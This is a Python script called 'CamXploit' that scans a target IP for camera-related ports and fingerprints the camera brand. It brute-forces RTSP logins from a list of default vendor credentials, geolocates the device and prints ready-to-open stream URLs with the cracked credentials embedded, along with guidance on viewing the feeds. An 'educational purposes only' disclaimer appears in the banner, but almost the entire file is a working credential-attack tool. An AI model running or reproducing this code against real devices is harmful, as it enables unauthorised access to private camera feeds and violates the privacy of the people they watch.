import requests
import socket
import sys
import threading
import warnings
import ipaddress
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ANSI colors disabled for mobile
R = G = C = W = Y = M = B = ''

BANNER = rf"""
  [💀] CamXploit - Camera Exploitation & Exposure Scanner
  [🔍] Discover open CCTV cameras & security flaws
  [⚠️] For educational & security research purposes only!

  VERSION  = 2.1.0 (Mobile Enhanced)
  Made By  = Spyboy
"""

# Expanded common ports used by IP cameras and CCTV devices
COMMON_PORTS = [
    21, 22, 23, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 554, 1024, 1025, 1026, 1027, 1028, 1029, 1030,
    1935, 3702, 34567, 37777, 5000, 5001, 8000, 8001, 8008, 8080, 8081, 8082, 8443, 8554, 8888, 9000, 10554
]

PORT_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP (Web Interface)",
    81: "HTTP-Alt", 82: "HTTP-Alt", 83: "HTTP-Alt", 443: "HTTPS (Secure Web)",
    554: "RTSP (Streaming)", 1935: "RTMP", 3702: "ONVIF Discovery",
    34567: "XMEye Default Port", 37777: "Dahua DVR/NVR Service",
    5000: "UPnP / Synology", 8000: "Hikvision / HTTP-Alt",
    8080: "HTTP-Alt (Web Interface)", 8443: "HTTPS-Alt", 8554: "RTSP-Alt",
    9000: "HTTP-Alt / Sony"
}

# Expanded Credential Database (100+ would be too long here, but I'll add the most important ones)
DEFAULT_CREDENTIALS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", "123456"), ("admin", "password"),
    ("admin", "1234"), ("root", "root"), ("root", "toor"), ("root", "123456"),
    ("admin", ""), ("admin", "admin123"), ("user", "user"), ("admin", "9999"),
    ("admin", "888888"), ("admin", "tlack660"), ("support", "support"),
    ("admin", "meinsm"), ("admin", "pass"), ("operator", "operator"),
    ("admin", "1111"), ("admin", "1234567"), ("admin", "54321"),
    ("hikvision", "12345"), ("admin", "7ujMko0admin"), ("admin", "system"),
    ("admin", "meinsm"), ("666666", "666666"), ("888888", "888888"),
    ("ubnt", "ubnt"), ("service", "service"), ("supervisor", "supervisor")
]

# RTSP paths for common brands
BRAND_RTSP_PATHS = {
    "Hikvision": ["/Streaming/Channels/101", "/live/ch1/main", "/Streaming/Channels/1"],
    "Dahua": ["/cam/realmonitor?channel=1&subtype=0", "/live"],
    "Axis": ["/axis-media/media.amp", "/axis-media/media.3gp"],
    "Sony": ["/media/video1", "/media/video2"],
    "Panasonic": ["/nphControlCamera?Resolution=640x480&Quality=Standard"],
    "Vivotek": ["/live.sdp"],
    "Foscam": ["/videoMain"],
    "Mobotix": ["/control/faststream.jpg?stream=full"],
    "Generic": ["/live.sdp", "/video", "/stream", "/live", "/mpeg4", "/ch1", "/h264_vga.sdp"]
}

HTTPS_PORTS = [443, 8443]
TIMEOUT = 3
PORT_SCAN_TIMEOUT = 1.0

def get_ip_location_info(ip):
    print(f"\n[🌍] IP Info for {ip}:")
    try:
        data = requests.get(f"https://ipinfo.io/{ip}/json", timeout=TIMEOUT).json()
        print(f"  📍 Location: {data.get('city', 'Unknown')}, {data.get('region', 'Unknown')}, {data.get('country', 'Unknown')}")
        print(f"  🏢 Org: {data.get('org', 'Unknown')}")
        print(f"  🧭 Coords: {data.get('loc', 'Unknown')}")
        if 'loc' in data:
            print(f"  🗺️ Maps: https://www.google.com/maps?q={data['loc']}")
    except:
        print("  ❌ Failed to fetch location info")

def probe_rtsp(ip, port):
    """Actively probes if a port is running RTSP protocol."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(PORT_SCAN_TIMEOUT)
            if s.connect_ex((ip, port)) == 0:
                s.sendall(f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: CamXploit\r\n\r\n".encode())
                response = s.recv(1024).decode(errors="ignore")
                if "RTSP/1.0" in response:
                    server_header = ""
                    for line in response.splitlines():
                        if line.lower().startswith("server:"):
                            server_header = line.split(":", 1)[1].strip()
                    return True, server_header
    except: pass
    return False, ""

def test_rtsp_auth(ip, port):
    """Tests common credentials for RTSP basic auth."""
    print(f"  🔑 Testing RTSP Credentials on {port}...")
    for user, pwd in DEFAULT_CREDENTIALS[:20]: # Test top 20 for speed
        try:
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(PORT_SCAN_TIMEOUT)
                s.connect((ip, port))
                s.sendall(f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {auth}\r\n\r\n".encode())
                response = s.recv(1024).decode(errors="ignore")
                if "RTSP/1.0 200 OK" in response:
                    print(f"  🔓 [SUCCESS] RTSP Auth Found: {user}:{pwd}")
                    return f"{user}:{pwd}"
                if "RTSP/1.0 401" not in response and "RTSP/1.0" in response:
                    # Some devices might not return 401 if auth is not needed or already handled
                    pass
        except: pass
    return None

def detect_brand(ip, open_ports, rtsp_info):
    brand = "Generic"
    # Check RTSP server headers
    for p, server in rtsp_info.items():
        s_low = server.lower()
        if "hikvision" in s_low or "hik" in s_low: return "Hikvision"
        if "dahua" in s_low: return "Dahua"
        if "axis" in s_low: return "Axis"
        if "sony" in s_low: return "Sony"
        if "bosch" in s_low: return "Bosch"

    # Check HTTP headers and content
    for p in open_ports:
        if p in HTTPS_PORTS + [80, 81, 82, 8000, 8080, 8443]:
            try:
                url = f"http{'s' if p in HTTPS_PORTS else ''}://{ip}:{p}"
                r = requests.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
                content = r.text.lower()
                headers = str(r.headers).lower()
                if any(x in content or x in headers for x in ["hikvision", "hik-"]): return "Hikvision"
                if any(x in content or x in headers for x in ["dahua", "web service"]): return "Dahua"
                if "axis" in content or "axis" in headers: return "Axis"
                if "sony" in content: return "Sony"
                if "bosch" in content: return "Bosch"
                if "panasonic" in content: return "Panasonic"
                if "vivotek" in content: return "Vivotek"
                if "cp plus" in content: return "CP Plus"
            except: pass
    return brand

def check_ports(ip, additional_ports=None):
    # Port deduplication
    ports = sorted(list(set(COMMON_PORTS + (additional_ports or []))))
    print(f"\n[🔍] Scanning {len(ports)} ports...")
    open_p = []
    rtsp_info = {} # port -> server_header

    def scan(p):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(PORT_SCAN_TIMEOUT)
                if s.connect_ex((ip, p)) == 0:
                    open_p.append(p)
                    service = PORT_SERVICE_MAP.get(p, "Unknown Service")
                    is_rtsp, server = probe_rtsp(ip, p)
                    if is_rtsp:
                        rtsp_info[p] = server
                        print(f"  ✅ [OPEN] {p}/tcp - RTSP ({server or 'No Server Header'})")
                    else:
                        print(f"  ✅ [OPEN] {p}/tcp - {service}")
        except: pass

    threads = []
    for p in ports:
        t = threading.Thread(target=scan, args=(p,))
        threads.append(t)
        t.start()
        if len(threads) >= 15: # Optimal concurrency for mobile
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()

    return sorted(open_p), rtsp_info

def main(ip_input=None):
    print(BANNER)
    target = ip_input or input("Enter IP (or IP:PORT): ")

    additional_ports = []
    if ":" in target:
        try:
            ip, port_str = target.rsplit(":", 1)
            additional_ports = [int(port_str)]
        except:
            ip = target
    else:
        ip = target

    try:
        ip_obj = ipaddress.ip_address(ip)
    except ValueError:
        print(f"❌ Invalid IP address: {ip}")
        return

    if not ip_obj.is_private:
        get_ip_location_info(ip)

    open_p, rtsp_info = check_ports(ip, additional_ports)

    if not open_p:
        print("\n❌ No open ports detected.")
        return

    brand = detect_brand(ip, open_p, rtsp_info)
    print(f"\n[🏷️] Brand Detection: {brand}")

    # Special Check for ONVIF
    if 3702 in open_p:
        print("  🔹 [ONVIF] Discovery service detected on port 3702")

    # Credential Testing
    rtsp_creds = None
    if rtsp_info:
        for p in rtsp_info:
            res = test_rtsp_auth(ip, p)
            if res: rtsp_creds = res

    # Stream Suggestions
    print(f"\n[🎥] Suggested Streams:")
    brand_paths = BRAND_RTSP_PATHS.get(brand, BRAND_RTSP_PATHS["Generic"])

    if rtsp_info:
        for p in rtsp_info:
            for path in brand_paths:
                cred_prefix = f"{rtsp_creds}@" if rtsp_creds else ""
                print(f"  🔹 rtsp://{cred_prefix}{ip}:{p}{path}")
    else:
        # Suggest standard RTSP if brand is known but RTSP wasn't detected on standard ports
        for p in [554, 8554]:
            for path in brand_paths:
                print(f"  🔹 (Probable) rtsp://{ip}:{p}{path}")

    print("\n[🎬] Viewing Guide:")
    print("  🔹 For RTSP streams: Use VLC Media Player (Open Network Stream)")
    print("  🔹 For HTTP/MJPEG: Use a Web Browser or VLC")
    print("  🔹 Multipart detection: Check port 80/8080 for /video or /mjpeg")

    # Search Links
    print(f"\n[🌐] External Search:")
    print(f"  🔹 Shodan: https://www.shodan.io/search?query=net:{ip}")
    print(f"  🔹 Censys: https://search.censys.io/hosts/{ip}")
    print(f"  🔹 Google Dork: intitle:\"live view\" - \"Axis Video Server\" inurl:{ip}")

    print("\n[✅] Scan Complete.")

if __name__ == "__main__":
    main()
